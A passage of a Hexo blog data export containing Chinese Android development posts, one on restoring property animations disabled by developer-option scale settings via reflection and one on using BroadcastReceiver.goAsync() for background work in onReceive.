count直接跳到结束状态。这里的sDurationScale也就是开发者选项中设置的动画缩放倍数。\n我们只要在动画初始化后，通过反射来重置一下这个静态变量即可：\n\n```java\nprivate void resetAnimatorDurationScale() {\n    try {\n        Field field = ValueAnimator.class.getDeclaredField(\"sDurationScale\");\n        field.setAccessible(true);\n        if (field.getFloat(null) == 0) {\n            field.setFloat(null, 1);\n        }\n    } catch (NoSuchFieldException | IllegalAccessException e) {\n        e.printStackTrace();\n    }\n}\n```\n\n但很显然，系统会在应用进程重启后第一次调用getWindowManagerService时重设这个值，所以必须得每次启动后都设置一次（比如在主Activity的onCreate中）。\n","slug":"如何防止开发者选项关闭动画后使其失效","published":1,"updated":"2024-03-25T07:31:25.850Z","comments":1,"photos":[],"link":"","_id":"cluaufh070003the66m7m6tu4","content":"<p>很多用户为了手机用起来感觉上快，在开发者选项里把系统动画给关了，即把那3个缩放比例改成了0，系统默认一般是1x。个人建议调到0.5x就很合适了，没必要关闭，否则某些动效比较多的App体验会很差。<br>本文的问题就是，当开发者选项中的动画缩放比例被全部调成0后，App中部分设置了duration的属性动画就会失效，表现为直接从开头跳到了结尾，没有动画过程。</p>\n<p>我们先分析下为什么会这样。<br>看ValueAnimator（&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;animation&#x2F;ValueAnimator.java）的部分源码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">doAnimationFrame</span><span class=\"params\">(<span class=\"type\">long</span> frameTime)</span> &#123;</span><br><span class=\"line\">    ......</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mLastFrameTime &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mSeekFraction &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">long</span> <span class=\"variable\">seekTime</span> <span class=\"operator\">=</span> (<span class=\"type\">long</span>) (getScaledDuration() * mSeekFraction); <span class=\"comment\">// 开发者选项改后此处为0</span></span><br><span class=\"line\">            mStartTime = frameTime - seekTime;</span><br><span class=\"line\">            mSeekFraction = -<span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        mStartTimeCommitted = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    mLastFrameTime = frameTime;</span><br><span class=\"line\">     </span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">currentTime</span> <span class=\"operator\">=</span> Math.max(frameTime, mStartTime);</span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">finished</span> <span class=\"operator\">=</span> animateBasedOnTime(currentTime);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (finished) &#123;</span><br><span class=\"line\">        endAnimation();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> finished;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">boolean</span> <span class=\"title function_\">animateBasedOnTime</span><span class=\"params\">(<span class=\"type\">long</span> currentTime)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">done</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mRunning) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">scaledDuration</span> <span class=\"operator\">=</span> getScaledDuration(); <span class=\"comment\">// 开发者选项改后此处为0</span></span><br><span class=\"line\">        ......</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (scaledDuration == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 0 duration animator, ignore the repeat count and skip to the end</span></span><br><span class=\"line\">            done = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; ......</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> done;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"type\">long</span> <span class=\"title function_\">getScaledDuration</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"type\">long</span>)(mDuration * sDurationScale); <span class=\"comment\">// 开发者选项修改直接影响sDuration的值</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>动画绘制是否结束取决于animateBasedOnTime方法，源码也注释到，如果duration为0，会忽略repeat count直接跳到结束状态。这里的sDurationScale也就是开发者选项中设置的动画缩放倍数。<br>我们只要在动画初始化后，通过反射来重置一下这个静态变量即可：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">resetAnimatorDurationScale</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> ValueAnimator.class.getDeclaredField(<span class=\"string\">&quot;sDurationScale&quot;</span>);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (field.getFloat(<span class=\"literal\">null</span>) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            field.setFloat(<span class=\"literal\">null</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>但很显然，系统会在应用进程重启后第一次调用getWindowManagerService时重设这个值，所以必须得每次启动后都设置一次（比如在主Activity的onCreate中）。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>很多用户为了手机用起来感觉上快，在开发者选项里把系统动画给关了，即把那3个缩放比例改成了0，系统默认一般是1x。个人建议调到0.5x就很合适了，没必要关闭，否则某些动效比较多的App体验会很差。<br>本文的问题就是，当开发者选项中的动画缩放比例被全部调成0后，App中部分设置了duration的属性动画就会失效，表现为直接从开头跳到了结尾，没有动画过程。</p>\n<p>我们先分析下为什么会这样。<br>看ValueAnimator（&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;animation&#x2F;ValueAnimator.java）的部分源码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"title function_\">doAnimationFrame</span><span class=\"params\">(<span class=\"type\">long</span> frameTime)</span> &#123;</span><br><span class=\"line\">    ......</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mLastFrameTime &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mSeekFraction &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">long</span> <span class=\"variable\">seekTime</span> <span class=\"operator\">=</span> (<span class=\"type\">long</span>) (getScaledDuration() * mSeekFraction); <span class=\"comment\">// 开发者选项改后此处为0</span></span><br><span class=\"line\">            mStartTime = frameTime - seekTime;</span><br><span class=\"line\">            mSeekFraction = -<span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        mStartTimeCommitted = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    mLastFrameTime = frameTime;</span><br><span class=\"line\">     </span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">currentTime</span> <span class=\"operator\">=</span> Math.max(frameTime, mStartTime);</span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">finished</span> <span class=\"operator\">=</span> animateBasedOnTime(currentTime);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (finished) &#123;</span><br><span class=\"line\">        endAnimation();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> finished;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">boolean</span> <span class=\"title function_\">animateBasedOnTime</span><span class=\"params\">(<span class=\"type\">long</span> currentTime)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">done</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mRunning) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">scaledDuration</span> <span class=\"operator\">=</span> getScaledDuration(); <span class=\"comment\">// 开发者选项改后此处为0</span></span><br><span class=\"line\">        ......</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (scaledDuration == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 0 duration animator, ignore the repeat count and skip to the end</span></span><br><span class=\"line\">            done = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; ......</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> done;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"type\">long</span> <span class=\"title function_\">getScaledDuration</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"type\">long</span>)(mDuration * sDurationScale); <span class=\"comment\">// 开发者选项修改直接影响sDuration的值</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>动画绘制是否结束取决于animateBasedOnTime方法，源码也注释到，如果duration为0，会忽略repeat count直接跳到结束状态。这里的sDurationScale也就是开发者选项中设置的动画缩放倍数。<br>我们只要在动画初始化后，通过反射来重置一下这个静态变量即可：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">resetAnimatorDurationScale</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> ValueAnimator.class.getDeclaredField(<span class=\"string\">&quot;sDurationScale&quot;</span>);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (field.getFloat(<span class=\"literal\">null</span>) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            field.setFloat(<span class=\"literal\">null</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>但很显然，系统会在应用进程重启后第一次调用getWindowManagerService时重设这个值，所以必须得每次启动后都设置一次（比如在主Activity的onCreate中）。</p>\n"},{"layout":"post","title":"goAsync帮你在onReceive中简便地进行异步操作","subtitle":"开阔视野。","date":"2018-10-19T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n广播回调onReceive是在主线程跑的，所以我们不能在里面搞耗时操作，不然秒秒钟ANR。\n\n又因为onReceive中的代码在执行完后，BroadcastReceiver对象就无效了，生命周期结束。\n所以我们不能直接在里面起子线程，若应用进程被回收掉，线程的任务就可能无法完成。徒增不可控因素。\n\n**解决：**\n普遍的处理方式是在onReceive中再起一个IntentService去执行异步操作。这样就有了Service组件的保障，进程不会被轻易杀掉，但同时这个操作也比较重，代码实现上还得再去写个处理特殊业务的IntentService。\n\n比如说我在onReceive里面只做一些很简单的耗时操作，可能就一两行代码我也要去写个Service？显然谷歌爹已经想到了这一点。\n\n在API 11以后，BroadcastReceiver新增了一个静态内部类PendingResult，我们可以通过调用goAsync()方法来获取这个PendingResult对象，然后就可以愉快地进行子线程操作了，最后通过调用它的finish方法来结束广播接收者的生命。一切就变得可控了（相当于强行给Receiver续命）。\n\n```java\n...\n    @Override\n    public void onReceive(final Context context, final Intent intent) {\n        final PendingResult result = goAsync();\n        AsyncHandler.post(new Runnable() {\n            @Override\n            public void run() {\n                // 在这里搞事情\n                ...\n                // 成功续命，可以手动结束了\n                result.finish();\n            }\n        });\n    }\n...\n```\n\n**要注意的是，尽管这里可以异步操作，但耗时超过10s依然会爆ANR。**\n其中AsyncHandler是一个简单封装的可复用的异步操作类（来自Android源码）：\n\n```java\n/**\n * Helper class for managing the background thread used to perform io operations\n * and handle async broadcasts.\n */\npublic final class AsyncHandler {\n \n    private static final HandlerThread sHandlerThread = new HandlerThread(\"AsyncHandler\");\n    private static final Handler sHandler;\n \n    static {\n        sHandlerThread.start();\n        sHandler = new Handler(sHandlerThread.getLooper());\n    }\n \n    public static void post(Runnable r) {\n        sHandler.post(r);\n    }\n \n    public static void postDelayed(Runnable r, long delayedMills) {\n        sHandler.postDelayed(r, delayedMills);\n    }\n \n    public static Message obtain(Runnable r) {\n        return Message.obtain(sHandler, r);\n    }\n \n    public static void sendMessageDelayed(Message message, long delayedMills) {\n        sHandler.sendMessageDelayed(message, delayedMills);\n    }\n \n    public static void removeCallbacks(int what) {\n        sHandler.removeMessages(what);\n    }\n \n    private AsyncHandler() {}\n}\n```\n\n最后，我们可以回味一下BroadcastReceiver源码是怎么描述PendingResult和goAsync的：\n\n```java\n    /**\n     * State for a result that is pending for a broadcast receiver.  Returned\n     * by {@link BroadcastReceiver#goAsync() goAsync()}\n     * while in {@link BroadcastReceiver#onReceive BroadcastReceiver.onReceive()}.\n     * This allows you to return from onReceive() without having the broadcast\n     * terminate; you must call {@link #finish()} once you are done with the\n     * broadcast.  This allows you to process the broadcast off of the main\n     * thread of your app.\n     *\n     * <p>Note on threading: the state inside of this class is not itself\n     * thread-safe, however you can use it from any thread if you properly\n     * sure that you do not have races.  Typically this means you will hand\n     * the entire object to another thread, which will be solely responsible\n     * for setting any results and finally calling {@link #finish()}.\n     */\n    public static class PendingResult {\n...\n    /**\n     * This can be called by an application in {@link #onReceive} to allow\n     * it to keep the broadcast active after returning from that function.\n     * This does <em>not</em> change the expectation of being relatively\n     * responsive to the broadcast (finishing it within 10s), but does allow\n     * the implementation to move work related to it over to another thread\n     * to avoid glitching the main UI thread due to disk IO.\n     *\n     * @return Returns a {@link PendingResult} representing the result of\n     * the active broadcast.  The BroadcastRecord itself is no longer active;\n     * all data and other interaction must go through {@link PendingResult}\n     * APIs.  The {@link PendingResult#finish PendingResult.finish()} method\n     * must be called once processing of the broadcast is done.\n     */\n    public final PendingResult goAsync() {\n        PendingResult res = mPendingResult;\n        mPendingResult = null;\n        return res;\n    }\n```\n","source":"_posts/2018-10-20-goAsync帮你在onReceive中简便地进行异步操作.md","raw":"---\nlayout:     post\ntitle:      goAsync帮你在onReceive中简便地进行异步操作\nsubtitle:   开阔视野。\ndate:       2018-10-20\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n---\n\n广播回调onReceive是在主线程跑的，所以我们不能在里面搞耗时操作，不然秒秒钟ANR。\n\n又因为onReceive中的代码在执行完后，BroadcastReceiver对象就无效了，生命周期结束。\n所以我们不能直接在里面起子线程，若应用进程被回收掉，线程的任务就可能无法完成。徒增不可控因素。\n\n**解决：**\n普遍的处理方式是在onReceive中再起一个IntentService去执行异步操作。这样就有了Service组件的保障，进程不会被轻易杀掉，但同时这个操作也比较重，代码实现上还得再去写个处理特殊业务的IntentService。\n\n比如说我在onReceive里面只做一些很简单的耗时操作，可能就一两行代码我也要去写个Service？显然谷歌爹已经想到了这一点。\n\n在API 11以后，BroadcastReceiver新增了一个静态内部类PendingResult，我们可以通过调用goAsync()方法来获取这个PendingResult对象，然后就可以愉快地进行子线程操作了，最后通过调用它的finish方法来结束广播接收者的生命。一切就变得可控了（相当于强行给Receiver续命）。\n\n```java\n...\n    @Override\n    public void onReceive(final Context context, final Intent intent) {\n        final PendingResult result = goAsync();\n        AsyncHandler.post(new Runnable() {\n            @Override\n            public void run() {\n                // 在这里搞事情\n                ...\n                // 成功续命，可以手动结束了\n                result.finish();\n            }\n        });\n    }\n...\n```\n\n**要注意的是，尽管这里可以异步操作，但耗时超过10s依然会爆ANR。**\n其中AsyncHandler是一个简单封装的可复用的异步操作类（来自Android源码）：\n\n```java\n/**\n * Helper class for managing the background thread used to perform io operations\n * and handle async broadcasts.\n */\npublic final class AsyncHandler {\n \n    private static final HandlerThread sHandlerThread = new HandlerThread(\"AsyncHandler\");\n    private static final Handler sHandler;\n \n    static {\n        sHandlerThread.start();\n        sHandler = new Handler(sHandlerThread.getLooper());\n    }\n \n    public static void post(Runnable r) {\n        sHandler.post(r);\n    }\n \n    public static void postDelayed(Runnable r, long delayedMills) {\n        sHandler.postDelayed(r, delayedMills);\n    }\n \n    public static Message obtain(Runnable r) {\n        return Message.obtain(sHandler, r);\n    }\n \n    public static void sendMessageDelayed(Message message, long delayedMills) {\n        sHandler.sendMessageDelayed(message, delayedMills);\n    }\n \n    public static void removeCallbacks(int what) {\n        sHandler.removeMessages(what);\n    }\n \n    private AsyncHandler() {}\n}\n```\n\n最后，我们可以回味一下BroadcastReceiver源码是怎么描述PendingResult和goAsync的：\n\n```java\n    /**\n     * State for a result that is pending for a broadcast receiver.  Returned\n     * by {@link BroadcastReceiver#goAsync() goAsync()}\n     * while in {@link BroadcastReceiver#onReceive BroadcastReceiver.onReceive()}.\n     * This allows you to return from onReceive() without having the broadcast\n     * terminate; you must call {@link #finish()} once you are done with the\n     * broadcast.  This allows you to process the broadcast off of the main\n     * thread of your app.\n     *\n     * <p>Note on threading: the state inside of this class is not itself\n     * thread-safe, however you can use it from any thread if you properly\n     * sure that you do not have races.  Typically this means you will hand\n     * the entire object to another thread, which will be solely responsible\n     * for setting any results and finally calling {@link #finish()}.\n     */\n    public static class PendingResult {\n...\n    /**\n     * This can be called by an application in {@link #onReceive} to allow\n     * it to keep the broadcast active after returning from that function.\n     * This does <em>not</em> change the expectation of being relatively\n     * responsive to the broadcast (finishing it within 10s), but does allow\n     * the implementation to move work related to it over to another thread\n     * to avoid glitching the main UI thread due to disk IO.\n     *\n     * @return Returns a {@link PendingResult} representing the result of\n     * the active broadcast.  The BroadcastRecord itself is no longer active;\n     * all data and other interaction must go through {@link PendingResult}\n     * APIs.  The {@link PendingResult#finish PendingResult.finish()} method\n     * must be called once processing of the broadcast is done.\n     */\n    public final PendingResult goAsync() {\n        PendingResult res = mPendingResult;\n        mPendingResult = null;\n        return res;\n    }\n```\n","slug":"goAsync帮你在onReceive中简便地进行异步操作","published":1,"updated":"2024-03-25T07:31:25.850Z","comments":1,"photos":[],"link":"","_id":"cluaufh0a0006the60bk3d0b4","content":"<p>广播回调onReceive是在主线程跑的，所以我们不能在里面搞耗时操作，不然秒秒钟ANR。</p>\n<p>又因为onReceive中的代码在执行完后，BroadcastReceiver对象就无效了，生命周期结束。<br>所以我们不能直接在里面起子线程，若应用进程被回收掉，线程的任务就可能无法完成。徒增不可控因素。</p>\n<p><strong>解决：</strong><br>普遍的处理方式是在onReceive中再起一个IntentService去执行异步操作。这样就有了Service组件的保障，进程不会被轻易杀掉，但同时这个操作也比较重，代码实现上还得再去写个处理特殊业务的IntentService。</p>\n<p>比如说我在onReceive里面只做一些很简单的耗时操作，可能就一两行代码我也要去写个Service？显然谷歌爹已经想到了这一点。</p>\n<p>在API 11以后，BroadcastReceiver新增了一个静态内部类PendingResult，我们可以通过调用goAsync()方法来获取这个PendingResult对象，然后就可以愉快地进行子线程操作了，最后通过调用它的finish方法来结束广播接收者的生命。一切就变得可控了（相当于强行给Receiver续命）。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceive</span><span class=\"params\">(<span class=\"keyword\">final</span> Context context, <span class=\"keyword\">final</span> Intent intent)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">PendingResult</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> goAsync();</span><br><span class=\"line\">        AsyncHandler.post(<span class=\"keyword\">new</span> <span class=\"title class_\">Runnable</span>() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 在这里搞事情</span></span><br><span class=\"line\">                ...</span><br><span class=\"line\">                <span class=\"comment\">// 成功续命，可以手动结束了</span></span><br><span class=\"line\">                result.finish();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p><strong>要注意的是，尽管这里可以异步操作，但耗时超过10s依然会爆ANR。</strong><br>其中AsyncHandler是一个简单封装的可复用的异步操作类（来自Android源码）：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Helper class for managing the background thread used to perform io operations</span></span><br><span class=\"line\"><span class=\"comment\"> * and handle async broadcasts.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AsyncHandler</span> &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">HandlerThread</span> <span class=\"variable\">sHandlerThread</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HandlerThread</span>(<span class=\"string\">&quot;AsyncHandler&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Handler sHandler;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        sHandlerThread.start();</span><br><span class=\"line\">        sHandler = <span class=\"keyword\">new</span> <span class=\"title class_\">Handler</span>(sHandlerThread.getLooper());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">post</span><span class=\"params\">(Runnable r)</span> &#123;</span><br><span class=\"line\">        sHandler.post(r);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">postDelayed</span><span class=\"params\">(Runnable r, <span class=\"type\">long</span> delayedMills)</span> &#123;</span><br><span class=\"line\">        sHandler.postDelayed(r, delayedMills);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Message <span class=\"title function_\">obtain</span><span class=\"params\">(Runnable r)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Message.obtain(sHandler, r);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sendMessageDelayed</span><span class=\"params\">(Message message, <span class=\"type\">long</span> delayedMills)</span> &#123;</span><br><span class=\"line\">        sHandler.sendMessageDelayed(message, delayedMills);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">removeCallbacks</span><span class=\"params\">(<span class=\"type\">int</span> what)</span> &#123;</span><br><span class=\"line\">        